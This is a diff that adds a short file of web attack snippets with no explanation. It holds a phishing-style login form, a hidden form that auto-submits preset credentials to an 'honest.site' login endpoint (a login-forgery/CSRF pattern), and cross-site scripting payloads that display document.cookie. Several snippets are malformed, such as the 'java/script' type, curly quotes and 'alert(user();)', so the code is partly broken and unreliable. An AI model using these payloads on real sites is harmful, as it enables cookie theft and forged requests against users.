@@ -1,0 +1,28 @@
+<script type="java/script">
+<form>
+<table>
+<tr><td>username</td><td><input type = "text" ></td></tr>
+<tr><td>password</td><td><input type = "password" ></td></tr>
+<tr><td>Submit</td><td><input type = "submit" ></td></tr>
+</table>
+</form>
+</script>
+
+
+
+<form method="POST" action="http://honest.site/login">
+  <input type="text" name="user" value="h4ck3r" />
+  <input type="password" name="pass" value="passw0rd" />
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+
+
+
+<SCRIPT>alert(“Cookie”+document.cookie)</SCRIPT>
+
+
+<SCRIPT>alert(user();)</SCRIPT>
